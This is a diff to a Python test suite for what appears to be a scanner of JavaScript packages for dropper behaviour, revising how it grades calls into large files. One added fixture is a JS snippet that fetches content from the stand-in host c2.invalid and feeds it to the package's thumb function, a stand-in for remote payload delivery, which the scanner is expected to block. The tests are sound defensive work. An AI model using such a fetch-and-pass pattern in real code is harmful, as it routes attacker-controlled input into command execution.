@@ -162,11 +162,18 @@ class TestTheGrade:
         assert found
         assert all(f.severity == Severity.MEDIUM for f in found)
 
-    def test_a_large_file_that_reaches_the_package_withdraws_it(self, tmp_path) -> None:
-        big = 'const t = require("../index");\n' + self.BIG
-        files = {"index.js": CommandKit.THUMB, "proto/index.js": big}
+    def test_a_large_file_that_hands_the_package_a_reply_blocks_it(self, tmp_path) -> None:
+        # The analysis reads it now (it once stopped at 1.5 MB and withdrew the lowering for any large file that required the package).
+        reply = (
+            'const { thumb } = require("../index");\n'
+            "(async () => {\n"
+            '  const body = await (await fetch("https://c2.invalid/x")).text();\n'
+            '  thumb(body, "/tmp/o.jpg", 1, { width: 8 });\n'
+            "})();\n"
+        )
+        files = {"index.js": CommandKit.THUMB, "proto/index.js": self.BIG + reply}
         result = CommandKit.scan(CommandKit.package(tmp_path / "p", files))
-        assert any(f.severity >= Severity.HIGH for f in CommandKit.dropper(result, "index.js"))
+        assert CommandKit.blocking(result)
 
     def test_a_reexport_of_a_large_file_with_no_call_through_it_leaves_it_lowered(
         self, tmp_path
@@ -182,7 +189,7 @@ class TestTheGrade:
         assert found
         assert all(f.severity == Severity.MEDIUM for f in found)
 
-    def test_a_call_through_a_reexport_into_a_large_file_withdraws_it(self, tmp_path) -> None:
+    def test_a_call_through_a_reexport_into_a_large_file_is_followed(self, tmp_path) -> None:
         files = {
             "index.js": CommandKit.THUMB,
             "proto/index.js": self.BIG,
@@ -190,13 +197,19 @@ class TestTheGrade:
             "run.js": 'const l = require("./lib");\nl.m(1);\n',
         }
         result = CommandKit.scan(CommandKit.package(tmp_path / "p", files))
-        assert any(f.severity >= Severity.HIGH for f in CommandKit.dropper(result, "index.js"))
+        found = CommandKit.dropper(result, "index.js")
+        assert found
+        assert all(f.severity == Severity.MEDIUM for f in found)
 
-    def test_a_large_file_another_calls_into_withdraws_it(self, tmp_path) -> None:
+    def test_a_large_file_another_calls_into_is_read_and_the_literal_call_leaves_it_lowered(
+        self, tmp_path
+    ) -> None:
         caller = 'const p = require("./proto");\np.m(1);\n'
         files = {"index.js": CommandKit.THUMB, "proto/index.js": self.BIG, "run.js": caller}
         result = CommandKit.scan(CommandKit.package(tmp_path / "p", files))
-        assert any(f.severity >= Severity.HIGH for f in CommandKit.dropper(result, "index.js"))
+        found = CommandKit.dropper(result, "index.js")
+        assert found
+        assert all(f.severity == Severity.MEDIUM for f in found)
 
     def test_called_only_with_literals_stays_lowered(self, tmp_path) -> None:
         caller = 'const { thumb } = require("./index");\nthumb("/tmp/a.mp4", "/tmp/o.jpg", 1, { width: 8 });\n'
